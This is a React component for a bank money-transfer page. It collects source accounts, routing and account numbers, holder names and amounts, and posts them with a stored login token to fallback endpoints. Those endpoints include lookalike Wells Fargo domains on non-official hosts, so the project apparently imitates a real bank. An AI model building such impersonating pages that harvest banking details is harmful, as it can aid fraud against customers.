import React, { useState, useEffect } from 'react';
import axios from 'axios';
import './TransferPage.css';

// Multiple API endpoints for fallback
const API_URLS = [
  process.env.REACT_APP_API_URL,
  'https://wellsapi.onrender.com/api',
  'https://wellsfargoca.net/api'
].filter(Boolean); // Remove any undefined values

const API_URL = API_URLS[0]; // Default to first URL

// Utility Function for Formatting Currency (matching dashboard implementation)
const formatCurrency = (amount) => {
  return new Intl.NumberFormat('en-US', {
    style: 'currency',
    currency: 'USD'
  }).format(amount);
};

// List of major US banks for the dropdown
const usBanks = [
  { id: 'chase', name: 'Chase Bank' },
  { id: 'bofa', name: 'Bank of America' },
  { id: 'wells', name: 'Wells Fargo' },
  { id: 'citi', name: 'Citibank' },
  { id: 'us', name: 'US Bank' },
  { id: 'pnc', name: 'PNC Bank' },
  { id: 'td', name: 'TD Bank' },
  { id: 'capital', name: 'Capital One' },
  { id: 'regions', name: 'Regions Bank' },
  { id: 'bbva', name: 'BBVA USA' },
  { id: 'suntrust', name: 'SunTrust Bank' },
  { id: 'citizens', name: 'Citizens Bank' },
  { id: 'fifth', name: 'Fifth Third Bank' },
  { id: 'keybank', name: 'KeyBank' },
  { id: 'other', name: 'Other (Enter manually)' }
];

const TransferPage = ({ accounts, onTransferComplete }) => {
  // State for transfer details
  const [fromAccount, setFromAccount] = useState('');
  const [toAccount, setToAccount] = useState('');
  const [amount, setAmount] = useState('');
  const [transferType, setTransferType] = useState('');
  const [transferOptions, setTransferOptions] = useState([
    { id: 'internal', name: 'Internal Transfer' },
    { id: 'external', name: 'External Account' },
    { id: 'new-recipient', name: 'New Recipient' }
  ]);

  // External bank transfer states
  const [selectedBank, setSelectedBank] = useState('');
  const [routingNumber, setRoutingNumber] = useState('');
  const [accountNumber, setAccountNumber] = useState('');
  const [accountHolderName, setAccountHolderName] = useState('');
  const [accountType, setAccountType] = useState('checking');
  const [customBankName, setCustomBankName] = useState('');

  // State for validation and error handling
  const [validationErrors, setValidationErrors] = useState({});
  const [transferHistory, setTransferHistory] = useState([]);

  // Reset external bank fields when transfer type changes
  useEffect(() => {
    if (transferType !== 'external') {
      setSelectedBank('');
      setRoutingNumber('');
      setAccountNumber('');
      setAccountHolderName('');
      setAccountType('checking');
      setCustomBankName('');
    }
  }, [transferType]);

  // Get token from localStorage
  const getAuthToken = () => {
    return localStorage.getItem('token') || sessionStorage.getItem('token');
  };

  // Validation function
  const validateTransfer = () => {
    const errors = {};

    if (!fromAccount) errors.fromAccount = 'Please select a source account';
    
    if (transferType === 'internal') {
      if (!toAccount) errors.toAccount = 'Please select a destination account';
      if (fromAccount === toAccount) errors.toAccount = 'Source and destination accounts cannot be the same';
    } 
    else if (transferType === 'external' || transferType === 'new-recipient') {
      if (!selectedBank) errors.selectedBank = 'Please select a bank';
      if (selectedBank === 'other' && !customBankName) errors.customBankName = 'Please enter the bank name';
      
      if (!routingNumber) errors.routingNumber = 'Please enter a routing number';
      else if (!/^\d{9}$/.test(routingNumber)) errors.routingNumber = 'Routing number must be 9 digits';
      
      if (!accountNumber) errors.accountNumber = 'Please enter an account number';
      else if (!/^\d{6,17}$/.test(accountNumber)) errors.accountNumber = 'Account number must be 6-17 digits';
      
      if (!accountHolderName) errors.accountHolderName = 'Please enter the account holder name';
    }
    
    if (!amount) errors.amount = 'Please enter an amount';
    if (amount && parseFloat(amount) <= 0) errors.amount = 'Amount must be greater than zero';
    if (!transferType) errors.transferType = 'Please select a transfer type';

    setValidationErrors(errors);
    return Object.keys(errors).length === 0;
  };

  // Transfer submission handler
  const handleTransfer = async (e) => {
    e.preventDefault();

    if (validateTransfer()) {
      try {
        const token = getAuthToken();
        
        if (!token) {
          alert('You must be logged in to make a transfer');
          return;
        }

        // Find the actual account objects to get account numbers
        const sourceAccountObj = accounts.find(acc => acc.id === fromAccount);
        const destinationAccountObj = transferType === 'internal' 
          ? accounts.find(acc => acc.id === toAccount)
          : null;

        // Build transfer data with account numbers instead of IDs
        let transferData = {
          transferType: transferType,
          fromAccount: sourceAccountObj?.accountNumber || fromAccount,
          amount: parseFloat(amount),
          transferDate: new Date().toISOString()
        };

        if (transferType === 'internal') {
          transferData.toAccount = destinationAccountObj?.accountNumber || toAccount;
        } else {
          // External or new recipient transfer
          transferData.bank = selectedBank === 'other' ? customBankName : usBanks.find(bank => bank.id === selectedBank)?.name;
          transferData.routingNumber = routingNumber;
          transferData.accountNumber = accountNumber;
          transferData.accountHolderName = accountHolderName;
          transferData.accountType = accountType;
        }

        console.log('Sending transfer request:', transferData);

        // Try multiple API endpoints with fallback
        let response = null;
        let lastError = null;

        for (let i = 0; i < API_URLS.length; i++) {
          try {
            console.log(`Attempting transfer with API: ${API_URLS[i]}`);
            
            response = await axios.post(
              `${API_URLS[i]}/transfers/transfer`,
              transferData,
              {
                headers: {
                  'Authorization': `Bearer ${token}`,
                  'Content-Type': 'application/json'
                },
                timeout: 10000 // 10 second timeout
              }
            );
            
            // If successful, break out of loop
            console.log(`Transfer successful with API: ${API_URLS[i]}`);
            break;
            
          } catch (error) {
            console.log(`Failed with API ${API_URLS[i]}:`, error.message);
            lastError = error;
            
            // If this was the last URL, throw the error
            if (i === API_URLS.length - 1) {
              throw lastError;
            }
            
            // Otherwise, continue to next URL
            continue;
          }
        }

        if (!response) {
          throw lastError || new Error('All API endpoints failed');
        }

        console.log('Transfer response:', response.data);

        if (response.data.success) {
          // Add to history
          const transferDetails = {
            ...transferData,
            confirmationNumber: response.data.data.confirmationNumber,
            status: response.data.data.status,
            date: new Date(),
            type: transferType
          };

          const updatedHistory = [transferDetails, ...transferHistory].slice(0, 5);
          setTransferHistory(updatedHistory);

          // Notify parent component
          if (onTransferComplete) {
            onTransferComplete(transferDetails);
          }

          // Reset form
          setFromAccount('');
          setToAccount('');
          setAmount('');
          setTransferType('');
          setSelectedBank('');
          setRoutingNumber('');
          setAccountNumber('');
          setAccountHolderName('');
          setAccountType('checking');
          setCustomBankName('');

          // Show success message
          alert(`Transfer successful!\nConfirmation: ${response.data.data.confirmationNumber}\nAmount: ${formatCurrency(parseFloat(amount))}`);
        }
      } catch (error) {
        console.error('Error executing transfer:', error);
        
        if (error.response) {
          // Server responded with error
          alert(`Transfer failed: ${error.response.data.error || 'Unknown error'}`);
        } else if (error.request) {
          // Request made but no response
          alert('Transfer failed: Unable to reach server. Please check your connection.');
        } else {
          // Something else happened
          alert(`Transfer failed: ${error.message}`);
        }
      }
    }
  };

  // Render account options
  const renderAccountOptions = (selectedAccount, setAccountFn, excludeAccount = null) => {
    return (
      <select 
        value={selectedAccount} 
        onChange={(e) => setAccountFn(e.target.value)}
        required
      >
        <option value="">Select Account</option>
        {accounts
          .filter(account => account.id !== excludeAccount)
          .map(account => (
            <option key={account.id} value={account.id}>
              {account.type} - {account.accountNumber} 
              ({formatCurrency(account.balance)})
            </option>
          ))
        }
      </select>
    );
  };

  // Render external bank form
  const renderExternalBankForm = () => {
    if (transferType !== 'external' && transferType !== 'new-recipient') return null;
    
    return (
      <div className="external-bank-details">
        <div className="form-group">
          <label>Select Bank</label>
          <select 
            value={selectedBank} 
            onChange={(e) => setSelectedBank(e.target.value)}
            required
          >
            <option value="">Select a Bank</option>
            {usBanks.map(bank => (
              <option key={bank.id} value={bank.id}>{bank.name}</option>
            ))}
          </select>
          {validationErrors.selectedBank && (
            <span className="error-message">{validationErrors.selectedBank}</span>
          )}
        </div>

        {selectedBank === 'other' && (
          <div className="form-group">
            <label>Bank Name</label>
            <input 
              type="text"
              placeholder="Enter bank name"
              value={customBankName}
              onChange={(e) => setCustomBankName(e.target.value)}
            />
            {validationErrors.customBankName && (
              <span className="error-message">{validationErrors.customBankName}</span>
            )}
          </div>
        )}

        <div className="form-group">
          <label>Routing Number</label>
          <input 
            type="text"
            placeholder="9-digit routing number"
            value={routingNumber}
            onChange={(e) => setRoutingNumber(e.target.value.replace(/\D/g, '').slice(0, 9))}
            maxLength={9}
          />
          {validationErrors.routingNumber && (
            <span className="error-message">{validationErrors.routingNumber}</span>
          )}
        </div>

        <div className="form-group">
          <label>Account Number</label>
          <input 
            type="text"
            placeholder="Account number"
            value={accountNumber}
            onChange={(e) => setAccountNumber(e.target.value.replace(/\D/g, '').slice(0, 17))}
            maxLength={17}
          />
          {validationErrors.accountNumber && (
            <span className="error-message">{validationErrors.accountNumber}</span>
          )}
        </div>

        <div className="form-group">
          <label>Account Holder Name</label>
          <input 
            type="text"
            placeholder="Full name on account"
            value={accountHolderName}
            onChange={(e) => setAccountHolderName(e.target.value)}
          />
          {validationErrors.accountHolderName && (
            <span className="error-message">{validationErrors.accountHolderName}</span>
          )}
        </div>

        <div className="form-group">
          <label>Account Type</label>
          <div className="radio-group">
            <label>
              <input 
                type="radio"
                name="accountType"
                value="checking"
                checked={accountType === 'checking'}
                onChange={() => setAccountType('checking')}
              />
              Checking
            </label>
            <label>
              <input 
                type="radio"
                name="accountType"
                value="savings"
                checked={accountType === 'savings'}
                onChange={() => setAccountType('savings')}
              />
              Savings
            </label>
          </div>
        </div>
      </div>
    );
  };

  return (
    <div className="transfer-page-container">
      <div className="transfer-header">
        <h1>Transfer Money</h1>
        <p>Choose how and where you want to transfer funds</p>
      </div>

      <div className="transfer-content">
        <section className="transfer-form">
          <form onSubmit={handleTransfer}>
            <div className="transfer-type-selector">
              {transferOptions.map(option => (
                <button
                  key={option.id}
                  type="button"
                  className={transferType === option.id ? 'selected' : ''}
                  onClick={() => setTransferType(option.id)}
                >
                  {option.name}
                </button>
              ))}
            </div>
            {validationErrors.transferType && (
              <span className="error-message">{validationErrors.transferType}</span>
            )}

            <div className="account-selection">
              <div className="from-account">
                <label>From Account</label>
                {renderAccountOptions(fromAccount, setFromAccount, toAccount)}
                {validationErrors.fromAccount && (
                  <span className="error-message">{validationErrors.fromAccount}</span>
                )}
              </div>

              {transferType === 'internal' && (
                <div className="to-account">
                  <label>To Account</label>
                  {renderAccountOptions(toAccount, setToAccount, fromAccount)}
                  {validationErrors.toAccount && (
                    <span className="error-message">{validationErrors.toAccount}</span>
                  )}
                </div>
              )}
            </div>

            {renderExternalBankForm()}

            <div className="amount-input">
              <label>Transfer Amount</label>
              <input 
                type="number"
                placeholder="Enter amount"
                value={amount}
                onChange={(e) => setAmount(e.target.value)}
                min="0.01"
                step="0.01"
              />
              {validationErrors.amount && (
                <span className="error-message">{validationErrors.amount}</span>
              )}
            </div>

            <button type="submit" className="transfer-submit-btn">
              Complete Transfer
            </button>
          </form>
        </section>

        <section className="transfer-history">
          <h2>Recent Transfers</h2>
          {transferHistory.length === 0 ? (
            <p>No recent transfers</p>
          ) : (
            <div className="history-list">
              {transferHistory.map((transfer, index) => (
                <div key={index} className="transfer-item">
                  <div className="transfer-details">
                    <span>
                      {transfer.type === 'internal' 
                        ? `${transfer.fromAccount} → ${transfer.toAccount}`
                        : `${transfer.fromAccount} → ${transfer.bank || 'External'} (${transfer.accountNumber?.slice(-4) || 'XXXX'})`
                      }
                    </span>
                    <span className="transfer-amount">
                      {formatCurrency(transfer.amount)}
                    </span>
                  </div>
                  <div className="transfer-meta">
                    {transfer.date.toLocaleDateString()} • {transfer.type === 'internal' ? 'Internal' : 'External'}
                  </div>
                </div>
              ))}
            </div>
          )}
        </section>
      </div>
    </div>
  );
};

export default TransferPage;